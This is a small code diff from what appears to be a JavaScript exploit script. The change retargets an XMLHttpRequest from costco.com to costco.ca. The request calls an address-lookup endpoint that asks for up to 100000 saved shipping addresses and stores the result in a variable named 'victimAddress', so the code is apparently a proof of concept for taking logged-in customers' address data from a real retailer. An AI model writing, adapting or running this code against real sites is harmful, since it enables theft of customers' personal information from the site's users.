@@ -19,7 +19,7 @@ xhr.send(requestBody);
 
 var victimAddress;
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://www.costco.com/AjaxCostcoGetAddressCmd?requesttype=ajax&addressType=S&filterName=ALL&filterOrder=RECENT&start=1&end=100000", true);
+xhr.open("GET", "https://www.costco.ca/AjaxCostcoGetAddressCmd?requesttype=ajax&addressType=S&filterName=ALL&filterOrder=RECENT&start=1&end=100000", true);
 
 xhr.onreadystatechange = function() {
   if (xhr.readyState === 4 && xhr.status === 200) {
